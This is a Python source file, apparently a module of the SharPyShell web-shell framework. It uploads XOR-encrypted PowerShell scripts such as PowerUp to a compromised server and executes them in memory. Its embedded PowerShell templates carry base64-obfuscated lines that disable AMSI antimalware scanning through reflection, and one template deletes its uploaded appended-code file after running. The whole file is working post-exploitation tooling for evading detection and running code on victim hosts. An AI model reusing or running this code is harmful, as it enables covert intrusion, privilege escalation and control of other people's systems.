from core import config
from core.Module import Module, ModuleException
from modules.upload import Upload
from modules.exec_ps import Exec_ps
from utils.random_string import random_generator
from utils.minify_code import minify_code
import traceback
import os


class InvokePsModuleModuleException(ModuleException):
    pass


class Invoke_ps_module(Module):
    _exception_class = InvokePsModuleModuleException
    short_help = "Run a ps1 script on the target server"
    complete_help = r"""
        This module upload and executes a powershell module that exists in the 'ps_modules/' SharPyShell directory.
        The ps1 module will be uploaded to the target server in an encrypted form and get decrypted at runtime in  
        memory.
        It is possible to execute additional code to the uploaded module in order to use functions inside of it or
        add additional behaviours. 
        
        Usage:
            #invoke_ps_module ps_module [appended_code]
            
        Positional arguments:
            ps_module               name of a .ps1 module existent in the 'ps_modules/' directory
            appended_code           powershell code to be run within the module uploaded
                                    Default: ''
        
        Examples:
            Upload and execute a simple module:
                #invoke_ps_module SharPyShell_Test.ps1
            Upload and execute a module using function defined in it:
                #invoke_ps_module PowerUp.ps1 ';Invoke-AllChecks'
    """

    _ps_code = r"""
                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZj1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtcycrJ2lVdGlscycpOw=="))|IEX;
                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZi5HZXRGaWVsZCgnYW1zaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOw=="))|IEX;
                $path_in_module="%s";
                $path_in_app_code="%s";
                $key=[System.Text.Encoding]::UTF8.GetBytes('%s');
                $enc_module=[System.IO.File]::ReadAllBytes($path_in_module);
                $enc_app_code=[System.IO.File]::ReadAllBytes($path_in_app_code);
                $dec_module=New-Object Byte[] $enc_module.Length;
                $dec_app_code=New-Object Byte[] $enc_app_code.Length;
                for ($i = 0; $i -lt $enc_module.Length; $i++) {
                    $dec_module[$i] = $enc_module[$i] -bxor $key[$i %% $key.Length];
                };
                for ($i = 0; $i -lt $enc_app_code.Length; $i++) {
                    $dec_app_code[$i] = $enc_app_code[$i] -bxor $key[$i %% $key.Length];
                };
                $dec_module=[System.Text.Encoding]::UTF8.GetString($dec_module);
                $dec_app_code=[System.Text.Encoding]::UTF8.GetString($dec_app_code);
                $($dec_module+$dec_app_code)|iex;
                Remove-Item -Path $path_in_app_code -Force 2>&1 | Out-Null;
    """

    _ps_code_no_appended_code = r"""
                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZj1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtcycrJ2lVdGlscycpOw==")) | IEX;
                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZi5HZXRGaWVsZCgnYW1zaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOw==")) | IEX;
                $path_in="%s";
                $key=[System.Text.Encoding]::UTF8.GetBytes('%s');
                $encrypted=[System.IO.File]::ReadAllBytes($path_in);
                $decrypted = New-Object Byte[] $encrypted.Length;
                for ($i = 0; $i -lt $encrypted.Length; $i++) {
                    $decrypted[$i] = $encrypted[$i] -bxor $key[$i %% $key.Length];
                };
                [System.Text.Encoding]::UTF8.GetString($decrypted)|iex; 
    """

    __default_appended_code = ''

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.upload_module_object = Upload(password, channel_enc_mode, module_settings, request_object)
        self.ps_module_object = Exec_ps(password, channel_enc_mode, module_settings, request_object)

    def __parse_run_args(self, args):
        if len(args) < 1:
            raise self._exception_class('#invoke_ps_module: Not enough arguments. 1 Argument required. \n')
        args_parser = {k: v for k, v in enumerate(args)}
        ps_module = args_parser.get(0)
        appended_code = args_parser.get(1, self.__default_appended_code)
        return ps_module, appended_code

    def __xor_bytearray(self, byte_array):
        key = self._password
        for i in range(len(byte_array)):
            byte_array[i] ^= ord(key[i % len(key)])

    def __encrypt_ps_file(self, file_path):
        with open(file_path, 'rb') as ps_module_handle:
            byte_arr_ps_module = bytearray(ps_module_handle.read())
        self.__xor_bytearray(byte_arr_ps_module)
        return byte_arr_ps_module

    def _gen_encrypted_module(self, ps_module):
        ps_module_path = config.modules_paths + 'ps_modules/' + ps_module
        ps_enc_module_path = ps_module_path + random_generator()
        byte_arr_ps_module_encrypted = self.__encrypt_ps_file(ps_module_path)
        with open(ps_enc_module_path, 'wb') as ps_module_enc_handle:
            ps_module_enc_handle.write(byte_arr_ps_module_encrypted)
        return ps_enc_module_path

    def _gen_appended_code(self, appended_code):
        if appended_code == '':
            return ''
        if '""' in appended_code:
            appended_code = appended_code.replace('""', '"')
        enc_appended_code_path = config.modules_paths + 'ps_modules/' + random_generator()
        byte_arr_app_module_encrypted = bytearray(appended_code, 'utf-8')
        self.__xor_bytearray(byte_arr_app_module_encrypted)
        with open(enc_appended_code_path, 'wb') as file_handle:
            file_handle.write(byte_arr_app_module_encrypted)
        encrypted_app_code_path = self._module_settings['env_directory'] + '\\' + random_generator()
        try:
            self._parse_response(self.upload_module_object.run([enc_appended_code_path, encrypted_app_code_path]))
        except Exception as exc:
            raise self._exception_class(str(exc))
        finally:
            if os.path.isfile(enc_appended_code_path):
                os.remove(enc_appended_code_path)
        return encrypted_app_code_path

    def _lookup_module(self, ps_module):
        if ps_module in self._module_settings.keys():
            encrypted_module_path = self._module_settings[ps_module]
        else:
            local_encrypted_module_path = self._gen_encrypted_module(ps_module)
            print ('\n\n\nUploading encrypted ps module....\n')
            try:
                encrypted_module_path = self._module_settings['env_directory'] + '\\' + random_generator()
                upload_response = self._parse_response(self.upload_module_object.run([local_encrypted_module_path,
                                                                                      encrypted_module_path]))
                print (upload_response)
                self._module_settings[ps_module] = encrypted_module_path
            except Exception as exc:
                raise self._exception_class(str(exc))
            finally:
                if os.path.isfile(local_encrypted_module_path):
                    os.remove(local_encrypted_module_path)
        return encrypted_module_path

    def _create_request(self, args):
        enc_module_path = args[0]
        enc_appended_code = args[1]
        if enc_appended_code != '':
            ps_code = minify_code(self._ps_code % (enc_module_path, enc_appended_code, self._password))
        else:
            ps_code = minify_code(self._ps_code_no_appended_code % (enc_module_path, self._password))
        return ps_code

    def run(self, args):
        try:
            ps_module, appended_code = self.__parse_run_args(args)
            enc_module_path = self._lookup_module(ps_module)
            enc_appended_code_path = self._gen_appended_code(appended_code)
            ps_code = self._create_request([enc_module_path, enc_appended_code_path])
            parsed_response = self._parse_response(self.ps_module_object.run([ps_code]))
            parsed_response = '\n\n\nModule executed correctly:\n' + parsed_response
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' + str(
                traceback.format_exc())
        return parsed_response
